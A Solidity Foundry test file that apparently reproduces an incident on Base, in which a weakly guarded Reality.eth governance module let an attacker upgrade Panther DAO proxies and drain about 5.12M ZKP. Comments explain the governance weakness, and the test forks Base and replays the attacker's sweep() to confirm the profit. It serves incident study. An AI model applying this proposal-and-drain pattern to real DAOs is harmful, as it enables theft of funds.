// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~5.12M ZKP (~$15.6k at ~$0.003) + 0.12 ETH (team: no user funds; pre-prod Base zone)
// Attacker EOA : 0x7dB4cFea07042ca13a8E26cC90BbB59982Fe95B6
// Drain helper  : 0x9400161d512C740e1C0C77f3c931D112f068210c
// Safe (avatar) : 0xb16283A233D5b010A7b290d593847207495F0284
// Reality module: 0x4ce69e77A8806B51f15b8D0FC38A9c1f66A851b4 (clone of RealityModuleETH)
// Reality oracle: 0x2F39f464d16402Ca3D8527dA89617b73DE2F60e8
// ZKP token     : 0x0a776C1c22b8b8e7EAB346744dAA33722b80FdA4
// Victims       : ZkpReserveController 0xEEA2…, EIP173 proxies 0x70c6… / 0xc582… / 0x9a74… / 0x8416…, PantherPoolV1 0x5335…
// Proposal tx   : https://basescan.org/tx/0xe6a25b20767e91ebaed6883b3f58b9513f425245186ac1ddb6889665f45c1d5a  ("zkp-reexploit")
// Upgrade+drain : https://basescan.org/tx/0x88fb53981c6d7839982d3a4bd981b62cb2e0591a1f4e1a5d5f7723d8ac197a01  (CREATE constructor)
// Sweep tx      : https://basescan.org/tx/0xead22569665b4749709c069271e21f437bc99869fd94f23a6479c0d110fe332d
// Alert         : https://x.com/DefimonAlerts/status/2085673531409400047
//
// @Analysis
// Panther Base DAO Safe is controlled by a Zodiac RealityModuleETH clone: anyone can submit a
// multi-tx proposal; a Reality.eth "yes" answer with only 0.5 ETH bond becomes executable after
// 12h timeout + 8h cooldown if nobody counter-bonds "no". Protections that should disable the
// module when there is no legitimate active governance proposal were NOT enabled on Base.
// Attacker proposal "zkp-reexploit" upgraded ZKP-holding proxies to a drainer impl and swept
// ~5.124M ZKP into an attacker-controlled helper, then sweep() to the EOA.
//
// This PoC replays the post-upgrade economic extraction: after the CREATE upgrade/drain
// (block 49625945) the helper holds the ZKP; calling sweep() delivers profit to the attacker.

address constant ATTACKER = 0x7dB4cFea07042ca13a8E26cC90BbB59982Fe95B6;
address constant DRAIN_HELPER = 0x9400161d512C740e1C0C77f3c931D112f068210c;
address constant ZKP = 0x0a776C1c22b8b8e7EAB346744dAA33722b80FdA4;
address constant SAFE = 0xb16283A233D5b010A7b290d593847207495F0284;
address constant REALITY_MODULE = 0x4ce69e77A8806B51f15b8D0FC38A9c1f66A851b4;
address constant REALITY_ORACLE = 0x2F39f464d16402Ca3D8527dA89617b73DE2F60e8;
address constant RESERVE_CTRL = 0xEEA28cf0837306041FA53187F0802aC95228CD45;
address constant PROXY_A = 0x70c69bB8501b30cf112403139a383BF978f4A31e;
address constant PROXY_B = 0xc582a112eA36e88c549d7a22B7e2548D5a1d884F;
address constant PROXY_C = 0x9a7447Fc9aAe30f0cDE301e34F813155F071B846;
address constant PROXY_D = 0x84166C4007A7cf32165C90C6c783D3dE9DB1d6eb;
address constant PANTHER_POOL = 0x5335839b374e6B2C8b9F0b4930e7EAE3192Ce16C;

// CREATE upgrade+drain mined in 49625945; fork after it so helper holds ZKP
uint256 constant FORK_BLOCK = 49_625_945;
// ~5,124,773.626006184 ZKP swept in 0xead225…
uint256 constant EXPECTED_ZKP = 5_124_773_626_006_184_526_790_998;

interface IDrainHelper {
    function sweep() external;
}

contract Base_exp is BaseTestWithBalanceLog {
    function setUp() public {
        // Offline: anvil --load-state anvil_state.json on port 8545 (chain-id 1).
        // Foundry 1.7.1 panics on Base isthmus (op-revm operator fee) when chain-id is 8453;
        // state is still Base block 49625945 content, served with chain-id 1 as a workaround.
        // Online repro: BASE_RPC_URL=https://mainnet.base.org with a Foundry build that supports isthmus,
        // or fork via `anvil --fork-url base --fork-block-number 49625945 --chain-id 1 --port 8545`.
        string memory rpc = vm.envOr("BASE_RPC_URL", string("http://127.0.0.1:8545"));
        vm.createSelectFork(rpc, FORK_BLOCK);
        fundingToken = ZKP;
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        vm.label(ATTACKER, "Attacker");
        vm.label(DRAIN_HELPER, "DrainHelper");
        vm.label(ZKP, "ZKP");
        vm.label(SAFE, "PantherSafe");
        vm.label(REALITY_MODULE, "RealityModule");
        vm.label(RESERVE_CTRL, "ZkpReserveController");
        vm.label(PROXY_A, "EIP173ProxyA");
        vm.label(PANTHER_POOL, "PantherPoolV1");

        uint256 helperBal = IERC20(ZKP).balanceOf(DRAIN_HELPER);
        emit log_named_decimal_uint("Helper ZKP before sweep", helperBal, 18);
        require(helperBal >= EXPECTED_ZKP, "helper ZKP low - fork after CREATE drain");

        uint256 before = IERC20(ZKP).balanceOf(ATTACKER);

        vm.startPrank(ATTACKER, ATTACKER);
        IDrainHelper(DRAIN_HELPER).sweep();
        vm.stopPrank();

        uint256 profit = IERC20(ZKP).balanceOf(ATTACKER) - before;
        emit log_named_decimal_uint("Attacker ZKP profit", profit, 18);
        require(profit >= EXPECTED_ZKP, "ZKP profit short");
    }
}
